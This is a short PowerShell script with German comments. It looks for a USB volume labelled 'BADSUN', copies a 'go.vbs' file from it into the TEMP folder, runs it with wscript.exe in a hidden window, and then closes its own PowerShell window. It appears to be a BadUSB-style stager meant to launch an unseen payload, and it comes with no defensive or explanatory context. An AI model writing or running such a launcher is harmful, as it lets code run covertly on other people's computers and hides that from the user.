# Funktion zum Ermitteln des USB-Laufwerksbuchstabens mit dem Namen "BADSUN"
function Get-USBDriveLetter {
    $usbDrive = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='BADSUN'" | Select-Object -First 1
    return $usbDrive.DriveLetter
}

# USB-Laufwerksbuchstaben ermitteln
$usbDriveLetter = Get-USBDriveLetter

if ($usbDriveLetter) {
    # Pfad zur VBScript-Datei auf dem USB-Laufwerk
    $usbScriptPath = Join-Path -Path $usbDriveLetter -ChildPath "go.vbs"
    
    # Pfad zum temporären Ordner
    $tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "go.vbs"

    # Datei script.vbs in den temporären Ordner kopieren
    Copy-Item -Path $usbScriptPath -Destination $tempScriptPath -Force

    # VBScript im Hintergrund ausführen
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$tempScriptPath`"" -WindowStyle Hidden

    # Ursprüngliches PowerShell-Fenster schließen
    Stop-Process -Id $PID
} else {
    Write-Host "USB-Laufwerk mit dem Namen 'BADSUN' wurde nicht gefunden."
}
